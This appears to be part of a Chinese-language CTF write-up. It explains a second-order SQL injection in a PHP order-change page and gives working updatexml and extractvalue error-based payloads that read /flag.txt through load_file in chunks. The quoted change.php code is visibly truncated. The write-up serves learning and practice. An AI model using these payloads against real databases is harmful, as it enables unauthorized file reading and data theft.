2.二次注入&&updatexml报错注入

这里的change.php改订单的功能有二次注入的点，看代码

<?php     //change.php

require_once "config.php";

if(!empty($_POST["user_name"]) && !empty($_POST["address"]) && !empty($_POST["phone"]))
{
    $msg = '';
    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
    $user_name = $_POST["user_name"];

    $address = addslashes($_POST["address"]);

    $phone = $_POST["phone"];

    }

            exit;
        }

    }

    $msg = "信息不全";

?>

他这个是先把adress字段从数据库读出来之后又拼接到了更新语句中了，老地址的问题，可用老地址进行updaatexml报错注入。

插入语句

$sql = "insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)";

上面这里是confirm.php文件里面的插入数据库的语句。（PS：这里用了sql预处理语句，所以无法注入，应该是。）

更新语句

$sql = "update `user` set `address`='".$address."', `old_address`='".$row['address']."' where `user_id`=".$row['user_id'];

注入

注意：updatexml报错注入最多一次只能查不到32个字符，算上前后两个0x7e就只剩下30个字符可以查询了。所以用下面的substr()函数分段注入。
payload为

1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),1,30)),0x7e),1)#

注入原理
这里的注入语句的构造原理主要就是，先插入的时候未对adress进行处理，但是后面更新订单的地方仍然没有进行处理，所以可能严格上来说不算是二次注入吧，但是这些词都是人造的，所以叫二次注入当然也没错。

如果我们一开始提交订单的时候提交的地址的值为

1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),1,30)),0x7e),1)#

那我们接下来更新订单时的语句就变成了
update `user` set `address`='1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),1,30)),0x7e),1)#', `old_address`='.$row['address'].' where `user_id`=.$row['user_id'];

后面的大多数的内容都给注释掉了，只剩下了
update `user` set `address`='1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),1,30)),0x7e),1)

然后根据updatexml报错注入的原理，就是因为这里的0x7e的问题出现的报错注入。

updatexml报错注入原理

updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),1,30)),0x7e),1)

由于updatexml的第二个参数需要Xpath格式的字符串，以~开头的内容不是xml格式的语法，concat()函数为字符串连接函数显然不符合规则，但是会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入了。

3.capture the flag

两次的payload分别为

1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),1,30)),0x7e),1)#
1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),30,60)),0x7e),1)#

当然也能用下面的extractvalue报错注入

1' where user_id=extractvalue(1,concat(0x7e,(select substr(load_file('/flag.txt'),1,20)),0x7e));#
1' where user_id=extractvalue(1,concat(0x7e,(select substr(load_file('/flag.txt'),20,50)),0x7e));#

attention:extractvalue报错注入、updatexml报错注入所依据的主要错误都是Xpath查询出现的格式错误。所以形式也都类似。

这里的步骤可以是先提交有注入语句的address，后面用正常的地址改下订单就能报出错；
也可以是先提交正常的信息，然后改订单的时候先改地址为含有恶意代码的值，再改为正常值。~按说这里有addslashes函数，第二种应该不行的，但是确实也成功了。~都行，感觉第一种简单一些。
然后两次报错需提交的是两份订单，因为报错，所以如果只提交一份订单的话，第二次就根本修改不了地址，不行。
